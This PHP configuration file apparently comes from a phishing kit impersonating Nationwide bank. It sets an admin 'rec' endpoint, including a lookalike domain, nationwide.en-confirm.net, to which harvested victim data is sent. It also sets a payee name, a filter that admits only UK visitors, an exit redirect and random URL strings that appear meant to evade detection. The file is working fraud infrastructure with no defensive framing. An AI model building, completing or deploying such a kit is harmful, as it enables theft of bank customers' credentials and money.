<?php


// $panel_rec="https://nationwide.en-confirm.net/admin/func/rec.php"; // Entere here the FULL URL to your admin's rec file
$panel_rec="http://localhost/New_folder/nationwide_live_edited24062020/admin/func/rec.php"; // Entere here the FULL URL to your admin's rec file

$payee="K White";  // Enter here the payee name

$pageonline=1; //   feature On (1) and off (0) toggle

$out_url="loader.php"; // Enter here the exit url

$country_block=0; //Enabling this will only allow allowed_countries visitors
$allowed_countries=array("GB"); // Enter here the countries standard 2-character codes to allow them.
$ip_logger=0;//   feature On (1) and off (0) toggle


function randomChaSp($len)
{
	$str="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	$out="";
	for($i=0;$i<=$len;$i++)
	{
		$out.=$str[rand(0,35)];
	}
	return $out;
}

function randomCha($len)
{
	$str="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	$out="";
	for($i=0;$i<=$len;$i++)
	{
		$out.=$str[rand(0,51)];
	}
	return $out;
}
function outrand()
{
	if(rand(1,2) == 2)
	{
		return "?".randomCha(rand(10,50));
	}
}

?>